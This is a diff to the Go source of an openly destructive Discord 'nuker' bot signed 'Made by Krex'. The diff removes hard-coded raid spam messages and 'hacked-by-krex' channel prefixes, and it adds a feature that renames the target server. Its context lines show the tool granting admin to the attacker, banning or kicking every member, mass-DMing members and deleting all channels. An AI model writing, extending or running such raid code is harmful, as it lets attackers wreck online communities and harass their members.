@@ -44,24 +44,9 @@ const (
 	██║  ██║███████╗╚██████╔╝██║███████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 	╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 	
-                                                          Made by Krex | V 1.20
+                                                          Made by Krex | v1.2.1
 `
 )
-
-var spamMessages = []string{
-	"# @everyone @here gg krex was here discord.gg/brazilia",
-	"# @everyone @here krexontop discord.gg/brazilia",
-	"# @everyone @here krex runs discord discord.gg/brazilia",
-	"# @everyone @here krex was here 💀 discord.gg/brazilia",
-}
-
-var channelPrefixes = []string{
-	"krex-",
-	"krexontop-",
-	"hacked-by-krex-",
-	"nuked-by-",
-	"destroyed-",
-}
 
 var (
 	unicodeRanges = [][]int{
@@ -323,6 +308,11 @@ func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options
 
 	go giveAdminToUser(s, guildID, userID)
 
+	// Change server name if enabled
+	if options.ChangeServerName {
+		go changeServerName(s, guildID, options.NewServerName)
+	}
+
 	if options.BanAll {
 		go BanAllMembers(s, guildID, options)
 	} else if options.KickAll {
@@ -368,6 +358,20 @@ func configureNukeOptions() NukeOptions {
 		}
 	}
 
+	printColored("[?] Change server name? (y/n): ", colorYellow)
+	changeName, _ := reader.ReadString('\n')
+	options.ChangeServerName = strings.TrimSpace(strings.ToLower(changeName)) == "y"
+
+	if options.ChangeServerName {
+		printColoredLine("[*] Current server name: "+options.NewServerName, colorCyan)
+		printColored("[?] Enter new server name (leave blank to use default): ", colorYellow)
+		name, _ := reader.ReadString('\n')
+		name = strings.TrimSpace(name)
+		if name != "" {
+			options.NewServerName = name
+		}
+	}
+
 	fmt.Println()
 	printColoredLine("[*] Nuke configuration:", colorCyan)
 	if options.BanAll {
@@ -377,6 +381,9 @@ func configureNukeOptions() NukeOptions {
 	}
 	if options.DmAll {
 		printColoredLine("  - Will DM all members with: "+options.DmMsg, colorGreen)
+	}
+	if options.ChangeServerName {
+		printColoredLine("  - Will change server name to: "+options.NewServerName, colorGreen)
 	}
 	fmt.Println()
 
@@ -411,6 +418,26 @@ func giveAdminToUser(s *discordgo.Session, guildID, userID string) {
 	}
 
 	printColoredLine("[+] Admin permissions given to user: "+userID, colorGreen)
+}
+
+func changeServerName(s *discordgo.Session, guildID, newName string) {
+	if newName == "" {
+		return
+	}
+
+	printColoredLine("[*] Changing server name to: "+newName, colorCyan)
+
+	guildParams := &discordgo.GuildParams{
+		Name: newName,
+	}
+
+	_, err := s.GuildEdit(guildID, guildParams)
+	if err != nil {
+		printColoredLine("[!] Error changing server name: "+err.Error(), colorRed)
+		return
+	}
+
+	printColoredLine("[+] Server name changed to: "+newName, colorGreen)
 }
 
 func deleteAllChannels(s *discordgo.Session, guildID string) {
